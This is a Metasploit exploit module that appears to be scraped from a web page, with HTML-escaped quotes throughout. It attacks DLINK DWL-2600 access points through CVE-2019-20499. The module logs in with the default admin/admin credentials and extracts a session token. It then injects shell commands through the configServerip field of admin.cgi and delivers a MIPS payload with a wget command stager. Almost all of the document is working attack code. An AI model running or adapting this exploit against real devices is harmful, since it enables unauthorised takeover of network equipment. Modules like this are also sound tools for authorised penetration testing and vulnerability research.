# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;DLINK DWL-2600 Authenticated Remote Command Injection&#039;,
      &#039;Description&#039; => %q{
          Some DLINK Access Points are vulnerable to an authenticated OS command injection.
          Default credentials for the web interface are admin/admin.
      },
      &#039;Author&#039;      =>
        [
          &#039;RAKI BEN HAMOUDA&#039;, # Vulnerability discovery and original research
          &#039;Nick Starke&#039; # Metasploit Module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [ &#039;CVE&#039;, &#039;2019-20499&#039; ],
          [ &#039;EDB&#039;, &#039;46841&#039; ]
        ],
      &#039;DisclosureDate&#039; => &#039;May 15 2019&#039;,
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => %w{ linux unix },
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
          &#039;BadChars&#039; => "\x00"
        },
      &#039;CmdStagerFlavor&#039; => :wget,
      &#039;Targets&#039;        =>
        [
          [ &#039;CMD&#039;,
            {
            &#039;Arch&#039; => ARCH_CMD,
            &#039;Platform&#039; => &#039;unix&#039;
            }
          ],
          [ &#039;Linux mips Payload&#039;,
            {
            &#039;Arch&#039; => ARCH_MIPSLE,
            &#039;Platform&#039; => &#039;linux&#039;
            }
          ],
        ],
      &#039;DefaultTarget&#039;  => 1
      ))

    register_options(
      [
        OptString.new(&#039;HttpUsername&#039;, [ true, &#039;The username to authenticate as&#039;, &#039;admin&#039; ]),
        OptString.new(&#039;HttpPassword&#039;, [ true, &#039;The password for the specified username&#039;, &#039;admin&#039; ]),
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;Base path to the Dlink web interface&#039;, &#039;/&#039; ])
      ])
  end

  def execute_command(cmd, opts={})
    bogus = Rex::Text.rand_text_alpha(rand(10))

    post_data = Rex::MIME::Message.new
    post_data.add_part("up", nil, nil, "form-data; name=\"optprotocol\"")
    post_data.add_part(bogus, nil, nil, "form-data; name=\"configRestore\"")
    post_data.add_part("; #{cmd} ;", nil, nil, "form-data; name=\"configServerip\"")

    print_status("Sending CGI payload using token: #{@token}") # Note token is an instance variable now
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;admin.cgi&#039;),
      &#039;ctype&#039;  => "multipart/form-data; boundary=#{post_data.bound}",
      &#039;cookie&#039; => "sessionHTTP=#{@token};",
      &#039;data&#039;   => post_data.to_s,
      &#039;query&#039;  => &#039;action=config_restore&#039;
    })

    unless res || res.code != 200
      fail_with(Failure::UnexpectedReply, "Command wasn&#039;t executed, aborting!")
    end

  rescue ::Rex::ConnectionError
    vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
    return
  end

  def exploit
    user = datastore[&#039;HttpUsername&#039;]
    pass = datastore[&#039;HttpPassword&#039;]
    rhost = datastore[&#039;RHOST&#039;]
    rport = datastore[&#039;RPORT&#039;]

    print_status("#{rhost}:#{rport} - Trying to login with #{user} / #{pass}")
    res = send_request_cgi({
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;/admin.cgi&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_post&#039;   => {
        &#039;i_username&#039; => user,
        &#039;i_password&#039; => pass,
        &#039;login&#039;      => &#039;Logon&#039;
      }
    })

    unless res && res.code != 404
      fail_with(Failure::NoAccess, "#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
    end

    unless [200, 301, 302].include?(res.code)
      fail_with(Failure::NoAccess, "#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
    end

    print_good("#{rhost}:#{rport} - Successful login #{user}/#{pass}")

    delstart = &#039;var cookieValue = "&#039;
    tokenoffset = res.body.index(delstart) + delstart.size
    endoffset = res.body.index(&#039;";&#039;, tokenoffset)
    @token = res.body[tokenoffset, endoffset - tokenoffset]

    if @token.empty?
      fail_with(Failure::NoAccess, "#{peer} - No Auth token received")
    end

    print_good("#{peer} - Received Auth token: #{@token}")
    if target.name =~ /CMD/
      unless datastore[&#039;CMD&#039;]
        fail_with(Failure::BadConfig, "#{rhost}:#{rport} - Only the cmd/generic payload is compatible")
      end
      execute_command(payload.encoded)
    else
      execute_cmdstager(linemax: 100, noconcat: true)
    end
  end
end

